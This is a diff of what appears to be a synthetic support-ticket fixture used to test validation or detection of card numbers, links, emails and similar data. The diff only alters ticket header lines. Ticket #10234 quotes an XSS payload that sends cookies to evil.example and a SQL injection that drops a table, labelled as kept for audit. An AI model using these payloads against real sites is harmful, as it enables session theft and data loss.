@@ -22,7 +22,7 @@ Second card attempt failed: 6011-0009-9013-9424 (Discover).
 A clearly bogus number was also submitted by a bot: 1234 5678 9012 3456
 — this fails the checksum and must be rejected.
 
-Ticket #10233 — chat transcript excerpt --------------------------
+Ticket #10233 — chat transcript excerpt 
 [10:41:03] agent: Please visit https://support.alueducation.com/tickets/10233?ref=chat
 [10:41:20] agent: You can also check our status page at http://status.alu.dev/
 [10:41:44] customer: ok, and the invoice pdf is at
@@ -32,7 +32,7 @@ Ticket #10233 — chat transcript excerpt --------------------------
            also trending today: #250Tech and #MadeInRwanda
 [10:42:30] customer: will do! also saw a promo, 30% off, total is €89.99 or about ¥14,200
 
-Ticket #10234 — SECURITY FLAG (input sanitized before storage) ---
+Ticket #10234 — SECURITY FLAG (input sanitized before storage) 
 Raw field as submitted by client (DO NOT execute, for audit only):
   name: <script>alert('xss')document.location='http://evil.example/steal?c='+document.cookie</script>
   comment: '); DROP TABLE tickets;--
@@ -54,14 +54,14 @@ New card used: 5555 5555 5555 4444 (Mastercard, valid test number).
 Old card on file was 378282246310005 (Amex, valid test number) but
 it's expired.
 
-Ticket #10236 — social team notes ---------------------------------
+Ticket #10236 — social team notes 
 Campaign mentions: #GraduationDay2026 #ALUFamily #TechForGood
 Sponsor link: http://bit.ly/3xAmPl3 and https://alueducation.com/news?id=204
 Budget approved: $12,000.00 USD, additional RWF 2,000,000 reserve.
 Contact for approvals: finance.desk@alueducation.com and
 cc: registrar@si.alueducation.com, si-admin@si.alueducation.com
 
-Ticket #10237 — flagged by spam filter, held for review -----------
+Ticket #10237 — flagged by spam filter, held for review 
 Submission came through the public contact form with several fields
 that don't pass basic validation; support lead asked that it be kept
 on file rather than deleted, in case the sender follows up.
@@ -76,7 +76,7 @@ on file rather than deleted, in case the sender follows up.
 Agent note: form data looks auto-generated / bot traffic, nothing here
 should be treated as a real contact detail.
 
-Ticket #10238 — misc numbers logged from other channels ------------
+Ticket #10238 — misc numbers logged from other channels 
 Collected from a few different support channels this week, formats
 are all over the place as usual.
 Customer support line (US, dot-separated): 555.123.4567
